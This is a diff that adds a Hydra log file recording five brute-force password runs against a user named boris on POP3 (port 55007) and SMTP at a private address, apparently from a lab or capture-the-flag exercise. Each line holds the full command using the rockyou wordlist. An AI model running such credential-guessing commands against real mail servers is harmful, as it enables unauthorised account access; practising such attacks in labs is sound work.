@@ -1,0 +1,5 @@
+# Hydra v9.6 run at 2026-05-29 21:21:16 on 10.49.171.172 pop3 (hydra -l boris -P /usr/share/wordlists/rockyou.txt -s 55007 -o hydra_pop3.txt 10.49.171.172 pop3)
+# Hydra v9.6 run at 2026-05-29 21:23:08 on 10.49.171.172 smtp (hydra -l boris -P /usr/share/wordlists/rockyou.txt -o hydra_pop3.txt 10.49.171.172 smtp)
+# Hydra v9.6 run at 2026-05-29 21:24:46 on 10.49.171.172 pop3 (hydra -l boris -P /usr/share/wordlists/rockyou.txt -s 55007 -o hydra_pop3.txt 10.49.171.172 pop3)
+# Hydra v9.6 run at 2026-05-29 21:28:30 on 10.49.171.172 pop3 (hydra -l Boris -P /usr/share/wordlists/rockyou.txt -s 55007 -o hydra_pop3.txt 10.49.171.172 pop3)
+# Hydra v9.6 run at 2026-05-29 21:34:48 on 10.49.171.172 pop3 (hydra -L username -P /usr/share/wordlists/rockyou.txt -s 55007 -o hydra_pop3.txt 10.49.171.172 pop3)
